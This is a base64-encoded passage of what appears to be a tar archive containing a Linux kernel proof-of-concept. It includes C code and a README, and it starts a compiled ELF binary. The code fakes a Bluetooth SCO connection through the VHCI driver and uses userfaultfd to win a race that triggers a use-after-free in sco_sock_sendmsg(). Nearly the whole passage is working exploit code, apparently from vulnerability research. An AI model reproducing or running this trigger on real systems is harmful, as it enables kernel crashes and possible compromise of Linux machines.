U1lOQ19DT05OX0NPTVBMRVRFOwogICAgICAgICAgICBfaGRyLT5wbGVuID0g
MTc7CiAgICAgICAgICAgIHN0cnVjdCBoY2lfZXZfc3luY19jb25uX2NvbXBs
ZXRlKiBjbXAgPSByZXBseSArIDM7CiAgICAgICAgICAgIGNtcC0+c3RhdHVz
ID0gMHgwOwogICAgICAgICAgICBjbXAtPmhhbmRsZSA9IDB4NGI7CiAgICAg
ICAgICAgIGNtcC0+YWlyX21vZGUgPSAweDAxOyAvLyBMTVBfQ1ZTRAogICAg
ICAgICAgICBjbXAtPmxpbmtfdHlwZSA9IDB4MDI7IC8vIEVTQ09fTElOSwog
ICAgICAgICAgICBjbXAtPnJldHJhbnNfd2luZG93ID0gMHgwOyAvLyA/CiAg
ICAgICAgICAgIGNtcC0+dHhfaW50ZXJ2YWwgPSAweDA7IAogICAgICAgICAg
ICBjbXAtPnR4X3BrdF9sZW4gPSAweDA7CiAgICAgICAgICAgIGNtcC0+cnhf
cGt0X2xlbiA9IDB4MDsKICAgICAgICAgICAgbWVtc2V0KCZjbXAtPmJkYWRk
ciwgMHhiYiwgNik7CiAgICAgICAgICAgIHJlcGx5X3dyYXBwZXIoZmQsIHJl
cGx5LCAyMCk7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9
CiAgICAgICAgY2FzZSBIQ0lfT1BfUkVBRF9SRU1PVEVfRVhUX0ZFQVRVUkVT
OiB7CiAgICAgICAgICAgIC8vIENvbW1hbmQgU3RhdHVzCiAgICAgICAgICAg
IHJlcGx5WzBdID0gSENJX0VWRU5UX1BLVDsKICAgICAgICAgICAgc3RydWN0
IGhjaV9ldmVudF9oZHIqIF9oZHIgPSByZXBseSArIDE7CiAgICAgICAgICAg
IF9oZHItPmV2dCA9IEhDSV9FVl9DTURfU1RBVFVTOyAvLyBldnQ7CiAgICAg
ICAgICAgIF9oZHItPnBsZW4gPSAweDQ7Ly8gcGxlbjsKICAgICAgICAgICAg
c3RydWN0IGhjaV9ldl9jbWRfc3RhdHVzKiBzdGF0dXMgPSByZXBseSArIDM7
CiAgICAgICAgICAgIHN0YXR1cy0+bmNtZCA9IDB4MDE7CiAgICAgICAgICAg
IHN0YXR1cy0+b3Bjb2RlID0gSENJX09QX1JFQURfUkVNT1RFX0VYVF9GRUFU
VVJFUzsKICAgICAgICAgICAgc3RhdHVzLT5zdGF0dXMgPSAweDA7CiAgICAg
ICAgICAgIHJlcGx5X3dyYXBwZXIoZmQsIHJlcGx5LCA3KTsKCiAgICAgICAg
ICAgIC8vIEhDSV9FVl9SRU1PVEVfRVhUX0ZFQVRVUkVTCiAgICAgICAgICAg
IG1lbXNldChyZXBseSwgMCwgc2l6ZW9mKHJlcGx5KSk7CiAgICAgICAgICAg
IHJlcGx5WzBdID0gSENJX0VWRU5UX1BLVDsKICAgICAgICAgICAgX2hkciA9
IHJlcGx5ICsgMTsKICAgICAgICAgICAgX2hkci0+ZXZ0ID0gSENJX0VWX1JF
TU9URV9FWFRfRkVBVFVSRVM7CiAgICAgICAgICAgIF9oZHItPnBsZW4gPSAx
MzsKICAgICAgICAgICAgc3RydWN0IGhjaV9ldl9yZW1vdGVfZXh0X2ZlYXR1
cmVzKiBmZWF0ID0gcmVwbHkgKyAzOwogICAgICAgICAgICBmZWF0LT5zdGF0
dXMgPSAweDA7CiAgICAgICAgICAgIGZlYXQtPmhhbmRsZSA9IDB4NGE7CiAg
ICAgICAgICAgIGZlYXQtPm1heF9wYWdlID0gMTsKICAgICAgICAgICAgZmVh
dC0+cGFnZSA9IDE7CiAgICAgICAgICAgIG1lbXNldCgmZmVhdC0+ZmVhdHVy
ZXMsIDAsIDgpOwogICAgICAgICAgICByZXBseV93cmFwcGVyKGZkLCByZXBs
eSwgMTYpOwogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQog
ICAgICAgIGNhc2UgSENJX09QX1JFTU9URV9OQU1FX1JFUTogewogICAgICAg
ICAgICAvLyBDb21tYW5kIFN0YXR1cwogICAgICAgICAgICByZXBseVswXSA9
IEhDSV9FVkVOVF9QS1Q7CiAgICAgICAgICAgIHN0cnVjdCBoY2lfZXZlbnRf
aGRyKiBfaGRyID0gcmVwbHkgKyAxOwogICAgICAgICAgICBfaGRyLT5ldnQg
PSBIQ0lfRVZfQ01EX1NUQVRVUzsgLy8gZXZ0OwogICAgICAgICAgICBfaGRy
LT5wbGVuID0gMHg0Oy8vIHBsZW47CiAgICAgICAgICAgIHN0cnVjdCBoY2lf
ZXZfY21kX3N0YXR1cyogc3RhdHVzID0gcmVwbHkgKyAzOwogICAgICAgICAg
ICBzdGF0dXMtPm5jbWQgPSAweDAxOwogICAgICAgICAgICBzdGF0dXMtPm9w
Y29kZSA9IEhDSV9PUF9SRU1PVEVfTkFNRV9SRVE7CiAgICAgICAgICAgIHN0
YXR1cy0+c3RhdHVzID0gMHgwOwogICAgICAgICAgICByZXBseV93cmFwcGVy
KGZkLCByZXBseSwgNyk7CgogICAgICAgICAgICAvLyBIQ0lfRVZfUkVNT1RF
X05BTUUKICAgICAgICAgICAgbWVtc2V0KHJlcGx5LCAwLCBzaXplb2YocmVw
bHkpKTsKICAgICAgICAgICAgcmVwbHlbMF0gPSBIQ0lfRVZFTlRfUEtUOwog
ICAgICAgICAgICBfaGRyID0gcmVwbHkgKyAxOwogICAgICAgICAgICBfaGRy
LT5ldnQgPSBIQ0lfRVZfUkVNT1RFX05BTUU7CiAgICAgICAgICAgIF9oZHIt
PnBsZW4gPSAyNTU7CiAgICAgICAgICAgIHN0cnVjdCBoY2lfZXZfcmVtb3Rl
X25hbWUqIG5hbWUgPSByZXBseSArIDM7CiAgICAgICAgICAgIG5hbWUtPnN0
YXR1cyA9IDB4MDsKICAgICAgICAgICAgbWVtc2V0KCZuYW1lLT5iZGFkZHIs
IDB4YmIsIDYpOwogICAgICAgICAgICBtZW1zZXQoJm5hbWUtPm5hbWUsICJB
QUEiLCAzKTsKICAgICAgICAgICAgcmVwbHlfd3JhcHBlcihmZCwgcmVwbHks
IDI1OCk7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9Ci8q
CglpZiAoIXN0YXR1cykgewoJCWlmIChsbXBfZXNjb19jYXBhYmxlKGNvbm4t
PmhkZXYpKQoJCQloY2lfc2V0dXBfc3luYyhzY28sIGNvbm4tPmhhbmRsZSk7
CgkJZWxzZQoJCQloY2lfYWRkX3NjbyhzY28sIGNvbm4tPmhhbmRsZSk7Cgl9
IGVsc2UgewoJCWhjaV9jb25uZWN0X2NmbShzY28sIHN0YXR1cyk7CgkJaGNp
X2Nvbm5fZGVsKHNjbyk7Cgl9CgogICAgQmVjYXVzZSBsb2NhbCBkZXZpY2Ug
ZmVhdHVyZXMgPSBlbXB0eTsKICAgIEhlbmNlIGhjaV9hZGRfc2NvIGlzIGNh
bGxlZAogICAgU2FkLCB3ZSBkb24ndCBrbm93IGhvdyB0byByZWFjdCB3aXRo
IHRoaXMgY29tbWFuZCwgbm8gdHJhY2UgaGVyZQogKi8KICAgICAgICBkZWZh
dWx0OgogICAgICAgICAgICBwcmludGYoIj8/P1xuIik7CiAgICAgICAgICAg
IHJldHVybiBmYWxzZTsKICAgICAgICAgICAgLy8gPz8/CiAgICB9Cn0KCnZv
aWQqIGNvbm5lY3RlZF90aHJlYWQodm9pZCogcGFyYW0pCnsKICAgIC8vIGFu
c3dlciBzb21lIHBhY2tldHMgdG8gbWFrZSBzdXJlIGNvbm5lY3Rpb24gaXMg
ZG9uZQogICAgd2hpbGUoMSkgewogICAgICAgIGNoYXIgYnVmWzEwMjRdID0g
ezB9OwogICAgICAgIHNzaXplX3QgYnVmX3NpemUgPSByZWFkKHZwLmZkLCBi
dWYsIHNpemVvZihidWYpKTsKICAgICAgICBpZiAoYnVmX3NpemUgPCAwKSBl
cnJFeGl0KCJyZWFkIGJ1ZiIpOwogICAgICAgIGlmIChidWZfc2l6ZSA+IDAg
JiYgYnVmWzBdID09IEhDSV9DT01NQU5EX1BLVCkgewogICAgICAgICAgICBk
dW1wX2NtZF9kYXRhKGJ1ZiwgYnVmX3NpemUpOwogICAgICAgICAgICBpZiAo
c2NvX3Byb2Nlc3NfY29tbWFuZF9wa3QodnAuZmQsIGJ1ZiArIDEsIGJ1Zl9z
aXplIC0gMSkpCiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAg
ICAgICAgZWxzZSBpZiAoYnVmX3NpemUgPiAwICYmIGJ1ZlswXSA9PSBIQ0lf
QUNMREFUQV9QS1QpIHsKICAgICAgICAgICAgZHVtcF9oZXgoYnVmLCBidWZf
c2l6ZSk7IC8vIEwyQ0FQX0lORk9fUkVRIC4uLgogICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgLy8gd2VyaWQKICAgICAgICAgICAgLy8g
ZG9uJ3QgY2FyZSBoZXJlCiAgICAgICAgICAgIC8vIGVyckV4aXQoIm1pc3Mg
aGFuZGxlZCBBQ0wgZGF0YSBwYWNrZXRcbiIpOwogICAgICAgICAgICAKICAg
ICAgICAgICAgLy8gbGV0IEFDTCBiZSBvdXIgYnJlYWsKICAgICAgICAgICAg
YnJlYWs7IAogICAgICAgIH0KICAgICAgICBlbHNlIGlmIChidWZfc2l6ZSA+
IDAgJiYgYnVmWzBdID09IEhDSV9TQ09EQVRBX1BLVCkgewogICAgICAgICAg
ICBkdW1wX2hleChidWYsIGJ1Zl9zaXplKTsKICAgICAgICAgICAgZXJyRXhp
dCgibWlzcyBoYW5kbGVkIFNDTyBkYXRhIHBhY2tldFxuIik7CiAgICAgICAg
fQogICAgfQp9CgpzdGF0aWMgdm9pZCAqCmZhdWx0X2hhbmRsZXJfdGhyZWFk
KHZvaWQgKmFyZykKewogICAgc3RhdGljIHN0cnVjdCB1ZmZkX21zZyBtc2c7
ICAgLyogRGF0YSByZWFkIGZyb20gdXNlcmZhdWx0ZmQgKi8KICAgIHN0YXRp
YyBpbnQgZmF1bHRfY250ID0gMDsgICAgIC8qIE51bWJlciBvZiBmYXVsdHMg
c28gZmFyIGhhbmRsZWQgKi8KICAgIGxvbmcgdWZmZDsgICAgICAgICAgICAg
ICAgICAgIC8qIHVzZXJmYXVsdGZkIGZpbGUgZGVzY3JpcHRvciAqLwogICAg
c3RhdGljIGNoYXIgKnBhZ2UgPSBOVUxMOwogICAgc3RydWN0IHVmZmRpb19j
b3B5IHVmZmRpb19jb3B5OwogICAgc3NpemVfdCBucmVhZDsKCiAgICB1ZmZk
ID0gKGxvbmcpIGFyZzsKCiAgICAvKiBDcmVhdGUgYSBwYWdlIHRoYXQgd2ls
bCBiZSBjb3BpZWQgaW50byB0aGUgZmF1bHRpbmcgcmVnaW9uICovCgogICAg
aWYgKHBhZ2UgPT0gTlVMTCkgewogICAgICAgIHBhZ2UgPSBtbWFwKE5VTEws
IHBhZ2Vfc2l6ZSwgUFJPVF9SRUFEIHwgUFJPVF9XUklURSwKICAgICAgICAg
ICAgICAgICAgIE1BUF9QUklWQVRFIHwgTUFQX0FOT05ZTU9VUywgLTEsIDAp
OwogICAgICAgIGlmIChwYWdlID09IE1BUF9GQUlMRUQpCiAgICAgICAgICAg
IGVyckV4aXQoIm1tYXAiKTsKICAgIH0KCiAgICBmb3IgKDs7KSB7CgogICAg
ICAgIC8qIFNlZSB3aGF0IHBvbGwoKSB0ZWxscyB1cyBhYm91dCB0aGUgdXNl
cmZhdWx0ZmQgKi8KCiAgICAgICAgc3RydWN0IHBvbGxmZCBwb2xsZmQ7CiAg
ICAgICAgaW50IG5yZWFkeTsKICAgICAgICBwb2xsZmQuZmQgPSB1ZmZkOwog
ICAgICAgIHBvbGxmZC5ldmVudHMgPSBQT0xMSU47CiAgICAgICAgbnJlYWR5
ID0gcG9sbCgmcG9sbGZkLCAxLCAtMSk7CiAgICAgICAgaWYgKG5yZWFkeSA9
PSAtMSkKICAgICAgICAgICAgZXJyRXhpdCgicG9sbCIpOwoKICAgICAgICAv
KiBSZWFkIGFuIGV2ZW50IGZyb20gdGhlIHVzZXJmYXVsdGZkICovCgogICAg
ICAgIG5yZWFkID0gcmVhZCh1ZmZkLCAmbXNnLCBzaXplb2YobXNnKSk7CiAg
ICAgICAgaWYgKG5yZWFkID09IDApIHsKICAgICAgICAgICAgcHJpbnRmKCJF
T0Ygb24gdXNlcmZhdWx0ZmQhXG4iKTsKICAgICAgICAgICAgZXhpdChFWElU
X0ZBSUxVUkUpOwogICAgICAgIH0KCiAgICAgICAgaWYgKG5yZWFkID09IC0x
KQogICAgICAgICAgICBlcnJFeGl0KCJyZWFkIik7CgogICAgICAgIGlmICht
c2cuZXZlbnQgIT0gVUZGRF9FVkVOVF9QQUdFRkFVTFQpIHsKICAgICAgICAg
ICAgZnByaW50ZihzdGRlcnIsICJVbmV4cGVjdGVkIGV2ZW50IG9uIHVzZXJm
YXVsdGZkXG4iKTsKICAgICAgICAgICAgZXhpdChFWElUX0ZBSUxVUkUpOwog
ICAgICAgIH0KCiAgICAgICAgLyogQ29weSB0aGUgcGFnZSBwb2ludGVkIHRv
IGJ5ICdwYWdlJyBpbnRvIHRoZSBmYXVsdGluZwogICAgICAgICAgIHJlZ2lv
bi4gVmFyeSB0aGUgY29udGVudHMgdGhhdCBhcmUgY29waWVkIGluLCBzbyB0
aGF0IGl0CiAgICAgICAgICAgaXMgbW9yZSBvYnZpb3VzIHRoYXQgZWFjaCBm
YXVsdCBpcyBoYW5kbGVkIHNlcGFyYXRlbHkuICovCgogICAgICAgIGlmICht
c2cuYXJnLnBhZ2VmYXVsdC5mbGFncyAmIFVGRkRfUEFHRUZBVUxUX0ZMQUdf
V1JJVEUpIHsKICAgICAgICAgICAgcHJpbnRmKCJbKl0gd3JpdGUgZmF1bHRc
biIpOwogICAgICAgICAgICBzdHJ1Y3QgdWZmZGlvX3JhbmdlIHJhbmdlOwog
ICAgICAgICAgICByYW5nZS5zdGFydCA9IG1zZy5hcmcucGFnZWZhdWx0LmFk
ZHJlc3MgJiB+KHBhZ2Vfc2l6ZSAtIDEpOwogICAgICAgICAgICByYW5nZS5s
ZW4gPSBwYWdlX3NpemU7CiAgICAgICAgICAgIGlmIChpb2N0bCh1ZmZkLCBV
RkZESU9fVU5SRUdJU1RFUiwgJnJhbmdlKSA9PSAtMSkKICAgICAgICAgICAg
ICAgIGVyckV4aXQoImlvY3RsLVVGRkRJT19VTlJFR0lTVEVSIik7CiAgICAg
ICAgICAgIGlmIChpb2N0bCh1ZmZkLCBVRkZESU9fV0FLRSwgJnJhbmdlKSA9
PSAtMSkKICAgICAgICAgICAgICAgIGVyckV4aXQoImlvY3RsLVVGRkRJT19X
QUtFIik7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcHJpbnRmKCJb
Kl0gcmVhZCBmYXVsdFxuIik7CgogICAgICAgICAgICAvLyB0aGF0J3Mgd2Ug
d2FudCwgbGV0J3MgY2xvc2UgdGhlIGRldmljZSBoZXJlCiAgICAgICAgICAg
IGNsb3NlKHZwLmZkKTsKCiAgICAgICAgICAgIC8vIHdlIHdhaXQgYSB3aGls
ZSB0byBlbnN1cmUgdGhlIGNsb3NlIGlzIGRvbmU/CiAgICAgICAgICAgIHVz
bGVlcCg1MDApOwoKICAgICAgICAgICAgKih1bnNpZ25lZCBsb25nIGludCAq
KXBhZ2UgPSAwOwogICAgICAgICAgICBtZW1jcHkocGFnZSwgIkhlbGxvIFdv
cmxkISIsIHN0cmxlbigiSGVsbG8gV29ybGQhIikpOwoKICAgICAgICAgICAg
ZmF1bHRfY250Kys7CgogICAgICAgICAgICB1ZmZkaW9fY29weS5zcmMgPSAo
dW5zaWduZWQgbG9uZykgcGFnZTsKCiAgICAgICAgICAgIHVmZmRpb19jb3B5
LmRzdCA9ICh1bnNpZ25lZCBsb25nKSBtc2cuYXJnLnBhZ2VmYXVsdC5hZGRy
ZXNzICYKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgfihwYWdlX3NpemUgLSAxKTsKICAgICAgICAgICAgdWZmZGlv
X2NvcHkubGVuID0gcGFnZV9zaXplOwogICAgICAgICAgICB1ZmZkaW9fY29w
eS5tb2RlID0gMDsKICAgICAgICAgICAgdWZmZGlvX2NvcHkuY29weSA9IDA7
CiAgICAgICAgICAgIGlmIChpb2N0bCh1ZmZkLCBVRkZESU9fQ09QWSwgJnVm
ZmRpb19jb3B5KSA9PSAtMSkKICAgICAgICAgICAgICAgIGVyckV4aXQoImlv
Y3RsLVVGRkRJT19DT1BZIik7CiAgICAgICAgfQogICAgfQp9CgppbnQgbWFp
bihpbnQgYXJnYywgY2hhciogYXJndltdKQp7CiAgICAvLyBhd2FrZWQgY29u
dHJvbGxlcgogICAgdnAgPSBpbml0aWFsaXplX3ZoY2koKTsKCiAgICAvLyBh
bGxvY2F0ZSBhIFNDTyBzb2NrZXQKICAgIGludCBzY29zb2NrID0gc29ja2V0
KEFGX0JMVUVUT09USCwgU09DS19TRVFQQUNLRVQsIEJUUFJPVE9fU0NPKTsK
ICAgIAogICAgLy8gYmluZCB0byBjb250cm9sbGVyCiAgICBzdHJ1Y3Qgc29j
a2FkZHJfc2NvIGxvY2FsX2FkZHIgPSB7MH07CiAgICBsb2NhbF9hZGRyLnNj
b19mYW1pbHkgPSBBRl9CTFVFVE9PVEg7CiAgICBtZW1zZXQoJmxvY2FsX2Fk
ZHIuc2NvX2JkYWRkciwgMHhhYSwgNik7CiAgICBpZiAoYmluZChzY29zb2Nr
LCAoc3RydWN0IHNvY2thZGRyICopJmxvY2FsX2FkZHIsIHNpemVvZihsb2Nh
bF9hZGRyKSkgPCAwKSBlcnJFeGl0KCJiaW5kIik7CgogICAgLy8gZ2V0IGNv
bm5lY3RlZCBTQ08gc29ja2V0CiAgICBwdGhyZWFkX3QgdGg7CiAgICBwdGhy
ZWFkX2NyZWF0ZSgmdGgsIE5VTEwsIGNvbm5lY3RlZF90aHJlYWQsIE5VTEwp
OwogICAgc3RydWN0IHNvY2thZGRyX3NjbyByZW1vdGVfYWRkciA9IHswfTsK
ICAgIHJlbW90ZV9hZGRyLnNjb19mYW1pbHkgPSBBRl9CTFVFVE9PVEg7CiAg
ICBtZW1zZXQoJnJlbW90ZV9hZGRyLnNjb19iZGFkZHIsIDB4YmIsIDYpOwog
ICAgaW50IHN0YXR1cyA9IGNvbm5lY3Qoc2Nvc29jaywgKHN0cnVjdCBzb2Nr
YWRkciAqKSZyZW1vdGVfYWRkciwgc2l6ZW9mKHJlbW90ZV9hZGRyKSk7CiAg
ICBpZiAoc3RhdHVzKSBlcnJFeGl0KCJjb25uZWN0Iik7CiAgICBwdGhyZWFk
X2pvaW4odGgsIE5VTEwpOwoKICAgIC8vIHNjbyBzZW5kbXNnIGFuZCBoYW5n
CiAgICAvLyB1c2luZyB1c2VyZmF1bHRmZAogICAgcHJpbnRmKCJzdGFydCBh
dHRhY2shIik7CiAgICAvLyAxLiBTZXR1cCB1c2VyZmF1bHRmZAoKICAgIGxv
bmcgdWZmZDsgICAgICAgICAgLyogdXNlcmZhdWx0ZmQgZmlsZSBkZXNjcmlw
dG9yICovCiAgICBjaGFyICphZGRyOyAgICAgICAgIC8qIFN0YXJ0IG9mIHJl
Z2lvbiBoYW5kbGVkIGJ5IHVzZXJmYXVsdGZkICovCiAgICB1bnNpZ25lZCBs
b25nIGxlbjsgIC8qIExlbmd0aCBvZiByZWdpb24gaGFuZGxlZCBieSB1c2Vy
ZmF1bHRmZCAqLwogICAgcHRocmVhZF90IHRocjsgICAgICAvKiBJRCBvZiB0
aHJlYWQgdGhhdCBoYW5kbGVzIHBhZ2UgZmF1bHRzICovCiAgICBzdHJ1Y3Qg
dWZmZGlvX2FwaSB1ZmZkaW9fYXBpOwogICAgc3RydWN0IHVmZmRpb19yZWdp
c3RlciB1ZmZkaW9fcmVnaXN0ZXI7CiAgICBpbnQgczsKCiAgICBwYWdlX3Np
emUgPSBzeXNjb25mKF9TQ19QQUdFX1NJWkUpOwogICAgbGVuID0gMSAqIHBh
Z2Vfc2l6ZTsKCiAgICAvKiBDcmVhdGUgYW5kIGVuYWJsZSB1c2VyZmF1bHRm
ZCBvYmplY3QgKi8KCiAgICB1ZmZkID0gc3lzY2FsbChfX05SX3VzZXJmYXVs
dGZkLCBPX0NMT0VYRUMgfCBPX05PTkJMT0NLKTsKICAgIGlmICh1ZmZkID09
IC0xKSBlcnJFeGl0KCJ1c2VyZmF1bHRmZCIpOwoKICAgIHVmZmRpb19hcGku
YXBpID0gVUZGRF9BUEk7CiAgICB1ZmZkaW9fYXBpLmZlYXR1cmVzID0gMDsK
ICAgIGlmIChpb2N0bCh1ZmZkLCBVRkZESU9fQVBJLCAmdWZmZGlvX2FwaSkg
PT0gLTEpCiAgICAgICBlcnJFeGl0KCJpb2N0bC1VRkZESU9fQVBJIik7Cgog
ICAgYWRkciA9IG1tYXAoTlVMTCwgbGVuLCBQUk9UX1JFQUQgfCBQUk9UX1dS
SVRFLAogICAgICAgICAgICAgICBNQVBfUFJJVkFURSB8IE1BUF9BTk9OWU1P
VVMsIC0xLCAwKTsKICAgIGlmIChhZGRyID09IE1BUF9GQUlMRUQpCiAgICAg
ICBlcnJFeGl0KCJtbWFwIik7CgogICAgdWZmZGlvX3JlZ2lzdGVyLnJhbmdl
LnN0YXJ0ID0gKHVuc2lnbmVkIGxvbmcpIGFkZHI7CiAgICB1ZmZkaW9fcmVn
aXN0ZXIucmFuZ2UubGVuID0gbGVuOwogICAgdWZmZGlvX3JlZ2lzdGVyLm1v
ZGUgPSBVRkZESU9fUkVHSVNURVJfTU9ERV9NSVNTSU5HOwogICAgaWYgKGlv
Y3RsKHVmZmQsIFVGRkRJT19SRUdJU1RFUiwgJnVmZmRpb19yZWdpc3Rlcikg
PT0gLTEpCiAgICAgICBlcnJFeGl0KCJpb2N0bC1VRkZESU9fUkVHSVNURVIi
KTsKCiAgICBzID0gcHRocmVhZF9jcmVhdGUoJnRociwgTlVMTCwgZmF1bHRf
aGFuZGxlcl90aHJlYWQsICh2b2lkICopIHVmZmQpOwogICAgaWYgKHMgIT0g
MCkgewogICAgICAgZXJybm8gPSBzOwogICAgICAgZXJyRXhpdCgicHRocmVh
ZF9jcmVhdGUiKTsKICAgIH0KCiAgICB3cml0ZShzY29zb2NrLCBhZGRyLCAx
Nik7IC8vIHRyaWdnZWVyIHBhZ2VmIGF1bHQKCiAgICB3aGlsZSgxKSB7fSAv
LyB3YWl0CgogICAgcmV0dXJuIDA7Cn0AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAByZXByby9SRUFE
TUUudHh0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
MDAwMDY2NAAwMDAxNzUwADAwMDE3NTAAMDAwMDAwMDA3MDAAMTQwNzE1NzIy
NjMAMDEyMDM3ACAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAHVzdGFyICAAbGluAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAABsaW4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAFBPQyBjb2RlIHRvIHRyaWdnZXIgVUFGIGluIHNjb19zb2NrX3Nl
bmRtc2coKS4KClRoZSBleGFtcGxlIGV4ZWN1dGFibGUgaXMgYnVpbHQgdXBv
biBWSENJIGRyaXZlciwgeW91IGNhbiBlYXNpbHkgdHJhbnNwb3J0IGl0IHRv
IHB0dHkrVUFSVCBsaWtlIG9sZCBQT0NzIChodHRwczovL3d3dy5vcGVud2Fs
bC5jb20vbGlzdHMvb3NzLXNlY3VyaXR5LzIwMjEvMDYvMDgvMikuCgotIE1h
a2VmaWxlOiB0cnkgd2l0aCBgbWFrZSB2aGNpYAotIHBvYy5jOiB0aGUgbWFp
biBQT0MgY29kZSwgaXQgd2lsbCBhdHRhY2sgYSBjb250cm9sbGVyLCBmYWtl
IGEgU0NPIGNvbm5lY3Rpb24gb24gaXQgYW5kIHRoZW4gdHJpZ2dlciB0aGUg
cmFjZQotIHN5emthbGxlcl91dGlscy5jL3N5emthbGxlcl91dGlscy5oOiBo
ZWxwZXIgY29kZSAoZnJvbSBzeXprYWxsZXIpIHRvIGludGVyYWN0IHdpdGgg
VkhDSQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcmVwcm8vcG9jAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAwMDA3NzUAMDAw
MTc1MAAwMDAxNzUwADAwMDAwMDQzNjUwADE0MDcxMzAwMTEzADAxMTA0MgAg
MAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAB1c3RhciAgAGxpbgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAbGluAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB/RUxG
AgEBAAAAAAAAAAAAAwA+AAEAAAAQDQAAAAAAAEAAAAAAAAAAaEAAAAAAAAAA
AAAAQAA4AAkAQAAdABwABgAAAAQAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAA
AAD4AQAAAAAAAPgBAAAAAAAACAAAAAAAAAADAAAABAAAADgCAAAAAAAAOAIA
AAAAAAA4AgAAAAAAABwAAAAAAAAAHAAAAAAAAAABAAAAAAAAAAEAAAAFAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoCsAAAAAAACgKwAAAAAAAAAAIAAA
AAAAAQAAAAYAAADgLAAAAAAAAOAsIAAAAAAA4CwgAAAAAAAwAwAAAAAAAMAD
AAAAAAAAAAAgAAAAAAACAAAABgAAAPAsAAAAAAAA8CwgAAAAAADwLCAAAAAA
AAACAAAAAAAAAAIAAAAAAAAIAAAAAAAAAAQAAAAEAAAAVAIAAAAAAABUAgAA
AAAAAFQCAAAAAAAARAAAAAAAAABEAAAAAAAAAAQAAAAAAAAAUOV0ZAQAAACo
KAAAAAAAAKgoAAAAAAAAqCgAAAAAAACUAAAAAAAAAJQAAAAAAAAABAAAAAAA
AABR5XRkBgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAQAAAAAAAAAFLldGQEAAAA4CwAAAAAAADgLCAAAAAAAOAsIAAAAAAA
IAMAAAAAAAAgAwAAAAAAAAEAAAAAAAAAL2xpYjY0L2xkLWxpbnV4LXg4Ni02
NC5zby4yAAQAAAAQAAAAAQAAAEdOVQAAAAAAAwAAAAIAAAAAAAAABAAAABQA
AAADAAAAR05VAIg367FPX0c+dlcJZG0IgCvG+WQkAgAAACAAAAABAAAABgAA
AAABAAAAAAACAAAAACAAAAA58oscAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
